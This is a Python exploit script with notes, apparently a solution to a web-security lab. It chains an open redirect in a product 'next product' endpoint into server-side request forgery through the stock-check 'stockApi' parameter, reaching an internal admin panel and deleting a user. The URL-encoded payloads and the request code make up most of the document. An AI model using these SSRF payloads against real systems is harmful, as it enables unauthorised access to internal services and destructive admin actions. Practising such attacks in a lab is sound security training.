# SSRF (Server Side Request Forgery) with filter bypass via open redirection vulnerability
'''
Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user Carlos

Analysis:
ctrl+shift+u get decoded
I must click to next product and then this send to repeater to and check GET path at the top 

admin page: /product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/

delete user: /product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos

'''

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Disable insecure request warning

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # Sending proxies to Burp

def delete_user(url):
    delete_user_ssrf_payload = '/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos'
    check_stock_path = '/product/stock' # Check page that is vulnerable
    params = {'stockApi': delete_user_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    admin_page_ssrf_payload = '/product/nextProduct?path=http://192.168.0.12:8080/admin'
    params2 = {'stockApi': admin_page_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'Carlos' not in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful")

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)

if __name__ == "__main__":
    main()
